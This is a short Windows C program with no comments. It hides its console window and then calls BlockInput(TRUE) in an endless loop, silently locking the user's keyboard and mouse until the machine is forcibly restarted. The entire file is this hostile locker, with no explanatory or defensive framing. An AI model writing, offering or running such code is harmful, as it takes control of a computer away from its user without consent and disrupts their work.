#include <windows.h>
void main(void) {
    FreeConsole();
    while (TRUE){
        BlockInput(TRUE);
    }
}
